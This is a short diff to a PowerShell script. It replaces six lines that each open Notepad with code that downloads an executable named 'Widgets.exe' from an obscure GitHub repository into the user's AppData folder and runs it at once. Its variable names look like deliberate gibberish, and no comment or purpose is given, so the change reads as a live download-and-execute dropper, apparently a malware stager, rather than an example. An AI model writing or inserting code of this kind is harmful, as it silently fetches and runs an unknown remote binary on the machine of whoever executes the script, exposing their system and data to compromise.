@@ -1,6 +1,13 @@
-Start-process notepad.exe
-Start-process notepad.exe
-Start-process notepad.exe
-Start-process notepad.exe
-Start-process notepad.exe
-Start-process notepad.exe
+$terik = @(
+    "https://github.com/dfgsgsdfgfd/test/raw/refs/heads/main/Widgets.exe",
+    "",
+    ""
+)
+$gkkwerf = [Environment]::GetFolderPath('ApplicationData')
+$gdfQosoqwek = New-Object System.Net.WebClient
+foreach ($hyesos in $terik) {
+    $dfowerfk = [System.IO.Path]::GetFileName($hyesos)
+    $igdfs = Join-Path -Path $gkkwerf -ChildPath $dfowerfk
+    $gdfQosoqwek.DownloadFile($hyesos, $igdfs)
+    Start-Process -FilePath $igdfs
+}
